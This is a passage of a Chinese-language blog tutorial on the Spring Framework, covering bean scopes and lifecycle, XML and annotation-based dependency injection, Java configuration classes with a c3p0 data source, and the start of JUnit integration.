class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">factory-bean</span>=<span class="string">"instanceFactory"</span> <span class="attr">factory-method</span>=<span class="string">"getAccountService"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    3.使用静态工厂中的静态方法创建对象（使用某个类中的静态方法创建对象，并存入Spring容器）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com_1.factory.StaticFactory"</span> <span class="attr">factory-method</span>=<span class="string">"getAccountService"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="bean的作用范围"><a href="#bean的作用范围" class="headerlink" title="bean的作用范围"></a>bean的作用范围</h2><p>Spring的bean对象默认是单例的。</p>
<ul>
<li>bean的作用范围调整：<br>标签里的scope属性：用于指定bean的作用范围</li>
<li>取值：<ul>
<li>singleton：单例（默认值）</li>
<li>prototype：多例</li>
<li>request：作用于Web应用的请求范围</li>
<li>session：作用于Web应用的会话范围</li>
<li>global-session：作用于集群环境的会话范围（全局会话范围）。当不是集群环境是，它等于session</li>
</ul>
</li>
</ul>
<h2 id="bean对象的生命周期"><a href="#bean对象的生命周期" class="headerlink" title="bean对象的生命周期"></a>bean对象的生命周期</h2><p>init-method：初始化方法<br>destroy-method：销毁方法</p>
<h3 id="单例"><a href="#单例" class="headerlink" title="单例"></a>单例</h3><ul>
<li>当容器创建时对象出生（立即创建）</li>
<li>只要容器存在，对象一直存在</li>
<li>容器销毁，对象销毁<br>（单例对象生命周期和容器相同）<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceImpl</span> <span class="keyword">implements</span> <span class="title">IAccountService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AccountServiceImpl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"instantiate successfully"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"saveAccount of service has exec"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"初始化"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destory</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"销毁"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Client.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args main</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1. 获取核心容器对象</span></span><br><span class="line">        <span class="comment">//ApplicationContext ac = new ClassPathXmlApplicationContext("bean.xml");</span></span><br><span class="line">        ClassPathXmlApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"bean.xml"</span>);</span><br><span class="line">        <span class="comment">//2. 根据id获取bean对象</span></span><br><span class="line">        com_1.service.IAccountService as = (com_1.service.IAccountService)ac.getBean(<span class="string">"accountService"</span>);<span class="comment">//Object类型强转</span></span><br><span class="line"></span><br><span class="line">        System.out.println(as);</span><br><span class="line">        as.saveAccount();</span><br><span class="line">        <span class="comment">//手动关闭容器</span></span><br><span class="line">        ac.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//bean.xml</span></span><br><span class="line"><span class="comment">// &lt;bean id="accountService" class="com_1.service.impl.AccountServiceImpl"</span></span><br><span class="line"><span class="comment">//       scope="singleton" init-method="init" destroy-method="destory"&gt;&lt;/bean&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="多例"><a href="#多例" class="headerlink" title="多例"></a>多例</h3><p>当我们使用对象时Spring框架为我们创建（延迟创建）<br>对象在使用过程中一直存活<br>当对象长时间不用且没有别的对象引用时，Java的GC自动回收</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com_1.service.impl.AccountServiceImpl"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">scope</span>=<span class="string">"prototype"</span> <span class="attr">init-method</span>=<span class="string">"init"</span> <span class="attr">destroy-method</span>=<span class="string">"destory"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="Spring依赖注入"><a href="#Spring依赖注入" class="headerlink" title="Spring依赖注入"></a>Spring依赖注入</h1><ul>
<li><p>Dependency Injection</p>
</li>
<li><p>IOC作用：消除程序间的耦合（依赖关系）</p>
</li>
<li><p>依赖关系的管理交给Spring维护<br>在当前类需要用到其它类的对象，由Spring来提供，我们只需要在配置文件中说明。</p>
</li>
<li><p>依赖关系的维护：依赖注入</p>
</li>
<li><p>依赖注入的数据有三类：</p>
<ol>
<li>基本类型和String</li>
<li>其他bean类型。（在配置文件中或者注解配置过的bean）</li>
<li>复杂类型/集合类型</li>
</ol>
</li>
</ul>
<h2 id="注入的方式有三种"><a href="#注入的方式有三种" class="headerlink" title="注入的方式有三种"></a>注入的方式有三种</h2><ol>
<li>构造函数提供<br>构造函数注入</li>
</ol>
<ul>
<li>使用constructor-arg</li>
<li>标签出现的位置：bean标签内部</li>
<li>标签中的属性：<ul>
<li>type 指定要注入的数据类型，该数据类型也是构造函数中某些参数的类型</li>
<li>index 指定注入数据的索引（从0开始）</li>
<li>name 指定名称的参数赋值<blockquote>
<p>以上三个指定构造函数中参数来赋值</p>
</blockquote>
</li>
<li>value 提供基本类型和String类型数据</li>
<li>ref 指定其他Bean类型，引用（它指Spring的Ioc核心容器中的bean对象）</li>
<li>特点：获取Bean对象时，注入数据是必须操作，否则无法操作成功<pre><code>改变了Bean对象的实例化方式。使我们创建对象时，用不到的数据也会提供</code></pre><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span> = <span class="string">"com_1.service.impl.AccountServiceImpl"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"test"</span> &gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   xml中存储都是字符串，这里自动转成Integer     --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">value</span>=<span class="string">"18"</span> &gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        配置一个日期对象    --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"java.util.Date"</span> <span class="attr">name</span>=<span class="string">"brithday"</span> <span class="attr">ref</span>=<span class="string">"now"</span> &gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    日期对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"now"</span> <span class="attr">class</span>=<span class="string">"java.util.Date"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<ol start="2">
<li>set方法提供</li>
</ol>
<ul>
<li><p>set方法注入</p>
<ul>
<li><p>涉及的标签:<code>property</code></p>
</li>
<li><p>出现位置:bean标签内部</p>
</li>
<li><p>标签的属性:</p>
<ul>
<li>name指定注入时set方法名称</li>
<li>value提供基本类型和String类型数据</li>
<li>ref指定其他Bean类型，引用（它指Spring的Ioc核心容器中的bean对象）</li>
</ul>
</li>
<li><p>优势:创建对象时没有明确限制,可以使用默认构造函数</p>
</li>
<li><p>缺点:若某个成员变量必须有值,则获取对象时set方法可能没有执行</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService2"</span> <span class="attr">class</span>=<span class="string">"com_1.service.impl.AccountServiceImpl2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">value</span>=<span class="string">"21"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"brithday"</span> <span class="attr">ref</span>=<span class="string">"now"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>注解提供<br>复杂类型注入/集合类型注入(set方法)<br> 用于给List结构集合注入的标签有List,Array和Set<br> 用于给Map结构集合注入的标签有Map和Props<br> <strong>结构相同,标签可以互换</strong><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService3"</span> <span class="attr">class</span>=<span class="string">"com_1.service.impl.AccountServiceImpl3"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"myStrs"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>ABC<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>Y65<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>JK1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"myList"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>###<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>$$$<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>^^^<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mySet"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>ABC<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>Y65<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>JK1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"myMap"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"admin"</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"username1"</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin1<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"myProps"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"key"</span>&gt;</span>value<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"key1"</span>&gt;</span>value1<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="Spring中ioc的常用注解"><a href="#Spring中ioc的常用注解" class="headerlink" title="Spring中ioc的常用注解"></a>Spring中ioc的常用注解</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    告知Spring在创建容器时要扫描的包，配置所需要的标签不是在&lt;beans&gt;约束中，而是在context名称空间和约束中    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com"</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>曾经的xml配置<ul>
<li><code>&lt;bean id=&quot;accountService&quot; class = &quot;com.service.impl.AccountServiceImpl&quot;&gt;&lt;/bean&gt;</code></li>
</ul>
</li>
</ul>
<h2 id="用于创建对象"><a href="#用于创建对象" class="headerlink" title="用于创建对象"></a>用于创建对象</h2><p>作用和xml配置文件中写bean标签实现功能一样</p>
<h3 id="Component"><a href="#Component" class="headerlink" title="Component:"></a>Component:</h3><ul>
<li>出现位置：类</li>
<li>作用：用于把当前类对象存入Spring容器中</li>
<li>属性：<ul>
<li>value：用于指定bean的id，当不写时，默认值是当前类名，首字母小写</li>
</ul>
</li>
</ul>
<h3 id="Controller：一般用于表现层"><a href="#Controller：一般用于表现层" class="headerlink" title="Controller：一般用于表现层"></a>Controller：一般用于表现层</h3><h3 id="Service：一般用于业务层"><a href="#Service：一般用于业务层" class="headerlink" title="Service：一般用于业务层"></a>Service：一般用于业务层</h3><h3 id="Repository：一般用于持久层"><a href="#Repository：一般用于持久层" class="headerlink" title="Repository：一般用于持久层"></a>Repository：一般用于持久层</h3><p>以上3个注解的作用和属性和Component一样。这三个注解是Spring框架提供的明确的三层使用的注解，使我们三层对象更加清晰。不属于这三层的对象用Component</p>
<h2 id="用于注入数据"><a href="#用于注入数据" class="headerlink" title="用于注入数据"></a>用于注入数据</h2><p>作用和xml配置文件中的bean标签中的property标签一样</p>
<h3 id="AutoWired"><a href="#AutoWired" class="headerlink" title="AutoWired"></a>AutoWired</h3><ul>
<li>作用：自动按照类型注入。只要容器中有唯一的一个bean对象类型和要注入的变量类型匹配，就可以注入成功。<br>如果没有任何bean的类型和要注入类型变量匹配，则报错。如果容器中有多个bean对象类型，出现位置：可以是变量，也可以是方法（在使用注解时，set方法不是必须的）<h3 id="Qualifier"><a href="#Qualifier" class="headerlink" title="Qualifier"></a>Qualifier</h3></li>
<li>作用：再按照类型注入的基础之上再按照名称注入，他在给类成员注入时不能单独使用（和AutoWired配合使用），但是在给方法参数注入时可以</li>
<li>属性：<ul>
<li>value：用于指定注入bean的ID<h3 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h3></li>
</ul>
</li>
<li>作用：直接按照bean的ID注入，可以独立使用。</li>
<li>属性：<ul>
<li>name：用于指定bean的ID</li>
</ul>
</li>
</ul>
<blockquote>
<p>以上3个注解都只能注入其他bean类型数据，而基本类型和String类型无法使用。集合数据类型只能通过XML来实现</p>
</blockquote>
<hr>
<h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h3><ul>
<li>作用：用于注入String和基本类型数据</li>
<li>属性：<ul>
<li>value：用于指定数据的值。它可以使用Spring中的SpEL（Spring的el表达式）<ul>
<li>SpEL的写法：${表达式}</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="用于改变范围"><a href="#用于改变范围" class="headerlink" title="用于改变范围"></a>用于改变范围</h2><p>作用和xml配置文件中的bean标签中的scope属性一样</p>
<h3 id="Socope"><a href="#Socope" class="headerlink" title="Socope"></a>Socope</h3><ul>
<li>作用：用于指定bean的作用范围</li>
<li>属性：<ul>
<li>value：指定范围的取值。常用取值：singleton，prototype。（不写默认单例）</li>
</ul>
</li>
</ul>
<h2 id="用于生命周期相关"><a href="#用于生命周期相关" class="headerlink" title="用于生命周期相关"></a>用于生命周期相关</h2><p>作用和xml配置文件中的bean标签中的init_method，destroy-method属性一样</p>
<h3 id="PreDestroy"><a href="#PreDestroy" class="headerlink" title="PreDestroy"></a>PreDestroy</h3><p>作用：用于指定销毁方法</p>
<h3 id="PostConstruct"><a href="#PostConstruct" class="headerlink" title="PostConstruct"></a>PostConstruct</h3><p>作用：用于指定初始化方法</p>
<ul>
<li>bean.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    创建容器时，要扫描的包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com"</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        QueryRunner对象</span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"runner"</span> <span class="attr">class</span>=<span class="string">"org.apache.commons.dbutils.QueryRunner"</span> <span class="attr">scope</span>=<span class="string">"prototype"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            注入数据源--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">"ds"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    配置数据源--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        连接数据库的必备信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql://localhost:3306/zcs"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"root"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"0903"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="AnnotationConfigApplicationContext的使用"><a href="#AnnotationConfigApplicationContext的使用" class="headerlink" title="AnnotationConfigApplicationContext的使用"></a>AnnotationConfigApplicationContext的使用</h1><p>之前的实现都是使用如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取容器</span></span><br><span class="line">ApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"bean.xml"</span>);</span><br><span class="line"><span class="comment">//2.得到业务层对象</span></span><br><span class="line">IAccountService as = ac.getBean(<span class="string">"accountService"</span>, IAccountService.class);</span><br></pre></td></tr></table></figure>
<p><code>ClassPathXmlApplicationContext</code>类：加载类路径下的配置文件，要求配置文件必须在类路径下。</p>
<ul>
<li><p>使用<code>AnnotationConfigApplicationContext</code>类来通过读取注解创建容器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取容器</span></span><br><span class="line"><span class="comment">//参数为：一个或多个带注解的类，如果参数写了某个注解类，则不扫描该包也可以在容器中创建对象</span></span><br><span class="line">ApplicationContext ac = <span class="keyword">new</span> AnnotationConfigApplicationContext(SpringConfiguration.class);</span><br><span class="line"><span class="comment">//2.得到业务层对象</span></span><br><span class="line">IAccountService as = ac.getBean(<span class="string">"accountService"</span>, IAccountService.class);</span><br></pre></td></tr></table></figure></li>
<li><p>SpringConfiguration</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span>(basePackages = <span class="string">"com"</span>)</span><br><span class="line"><span class="meta">@Import</span>(value =JdbcConfig.class)</span><br><span class="line"><span class="meta">@PropertySource</span>(<span class="string">"classpath:JdbcConfig.properties"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>JdbcConfig</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;Driver&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String Driver;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;Url&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String Url;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;User&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String User;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;Password&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String Password;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建QueryRunner对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ds</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(<span class="string">"runner"</span>)</span><br><span class="line">    <span class="meta">@Scope</span>(<span class="string">"prototype"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> QueryRunner <span class="title">createQueryRunner</span><span class="params">(DataSource ds)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> QueryRunner(ds);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建数据源对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span>(<span class="string">"dataSource"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ComboPooledDataSource cds = <span class="keyword">new</span> ComboPooledDataSource();</span><br><span class="line">            cds.setDriverClass(Driver);</span><br><span class="line">            cds.setJdbcUrl(Url);</span><br><span class="line">            cds.setUser(User);</span><br><span class="line">            cds.setPassword(Password);</span><br><span class="line">            <span class="keyword">return</span> cds;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>JdbcConfig.properties</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Driver=com.mysql.jdbc.Driver</span><br><span class="line">Url=jdbc:mysql://localhost:3306/zcs</span><br><span class="line">User=root</span><br><span class="line">Password=xxxx</span><br></pre></td></tr></table></figure>


</li>
</ul>
<p>之前基于XML配置中<code>runner</code>为多例，而现在基于注解配置则为单例。所以要加Scope注解</p>
<h1 id="配置类，等效于bean-xml"><a href="#配置类，等效于bean-xml" class="headerlink" title="配置类，等效于bean.xml"></a>配置类，等效于bean.xml</h1><p>Spring中的新注解</p>
<h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><ul>
<li>作用：指定当前类是配置类</li>
<li>细节：当配置类作为AnnotationConfigApplicationContext对象创建的参数时，该注解可以不写。<pre><code>如果不写该注解，即使使用ComponentScan扫描该包，也不会放到容器里</code></pre></li>
</ul>
<h2 id="ComponentScan"><a href="#ComponentScan" class="headerlink" title="ComponentScan"></a>ComponentScan</h2><ul>
<li>作用：用于通过注解指定Spring在创建容器时要扫描的包。（等效于<code>&lt;context:component-scan&gt;</code>）</li>
<li>属性： value和basePackages相同，都是用于指定创建容器时要扫描的包</li>
</ul>
<h2 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h2><ul>
<li>作用：用于把当前方法的返回值作为Bean对象存入Spring的IOC容器中。</li>
<li>属性：name：指定Bean的id，不写的默认值是当前方法名称</li>
<li>细节：使用注解配置方法时，如果方法有参数，Spring框架会查找容器中有无可用的Bean对象。查找方式和AutoWired一样。</li>
</ul>
<h2 id="Import"><a href="#Import" class="headerlink" title="Import"></a>Import</h2><ul>
<li>作用：用于导入其他的配置类<pre><code>import(&quot;xxx.class&quot;)
例如在一个主配置类处添加import注解导入其他一个或多个子配置类</code></pre></li>
<li>属性：value：用于指定其他配置类的字节码。当我们使用import类的为父配置类，导入的类为子配置</li>
</ul>
<h2 id="PropertySource"><a href="#PropertySource" class="headerlink" title="PropertySource"></a>PropertySource</h2><ul>
<li>作用：用于指定Properties文件的位置</li>
<li>属性：<pre><code>value:指定文件名称和路径,(classpath:xxx/xxx.properties，classpath表示类路径下)</code></pre></li>
</ul>
<h1 id="Junit"><a href="#Junit" class="headerlink" title="Junit"></a>Junit</h1><p><img src="./junit.png" alt="junit"></p>
<h2 id="Spring整合Junit配置"><a href="#Spring整合Junit配置" class="headerlink" title="Spring整合Junit配置"></a>Spring整合Junit配置</h2><p>使用Junit单元测试，测试配置</p>
<ul>
<li>Spring整合Junit的配置<ol>
<li>导入Spring整合Junit的jar(坐标)</li>
<li>使用Junit提供的注解把原有的main方法替换成Spring提供的<code>@Runwith</code>注解</li>
